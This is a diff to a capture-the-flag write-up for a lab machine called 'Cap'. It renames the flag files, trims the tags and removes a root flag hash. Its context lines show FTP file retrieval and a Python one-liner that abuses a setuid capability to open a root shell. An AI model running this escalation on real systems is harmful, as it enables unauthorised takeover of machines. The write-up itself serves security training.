@@ -1,7 +1,7 @@
 ---
 title: Cap
 slug: Cap
-tags: [Linux, Wireshark, FTP, Vulnerability Research]
+tags: [Vulnerability Research]
 ---
 ## Executive Summary
 
@@ -155,12 +155,12 @@ ftp> ls
 -rw-rw-r--    1 1001     1001            0 Jun 14 19:19 linpeas.sh.2
 -rw-rw-r--    1 0        1001            0 Jun 14 19:48 server.py
 drwxr-xr-x    3 1001     1001         4096 Jun 14 14:59 snap
--r--------    1 1001     1001           33 Jun 14 07:56 user.txt
+-r--------    1 1001     1001           33 Jun 14 07:56 local-proof.txt
 226 Directory send OK.
-ftp> get user.txt
-local: user.txt remote: user.txt
+ftp> get local-proof.txt
+local: local-proof.txt remote: local-proof.txt
 229 Entering Extended Passive Mode (|||9060|)
-150 Opening BINARY mode data connection for user.txt (33 bytes).
+150 Opening BINARY mode data connection for local-proof.txt (33 bytes).
 100% |******************************|    33      257.81 KiB/s    00:00 ETA
 226 Transfer complete.
 33 bytes received in 00:00 (0.09 KiB/s)
@@ -179,7 +179,7 @@ nathan@cap:~$ sudo -l
 [sudo] password for nathan:
 Sorry, user nathan may not run sudo on cap.
 nathan@cap:~$ ls
-CVE-2022-2588  exploit.c   linpeas.sh.1  server.py  user.txt
+CVE-2022-2588  exploit.c   linpeas.sh.1  server.py  local-proof.txt
 escalar.py     linpeas.sh  linpeas.sh.2  snap
 nathan@cap:~$ getcap
 usage: getcap [-v] [-r] [-h] [-n] <filename> [<filename> ...]
@@ -206,13 +206,12 @@ nathan@cap:~$ getcap -r / 2>/dev/null
 ```bash
 nathan@cap:~$ python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
 # ls
-CVE-2022-2588  exploit.c   linpeas.sh.1  server.py  user.txt
+CVE-2022-2588  exploit.c   linpeas.sh.1  server.py  local-proof.txt
 escalar.py     linpeas.sh  linpeas.sh.2  snap
 # cd /root
 # ls
-root.txt  snap
-# cat root.txt
-70ad380c3dfb6b41cb9d4c19db28081c
+privileged-proof.txt  snap
+# cat privileged-proof.txt
 ```
 
 ---
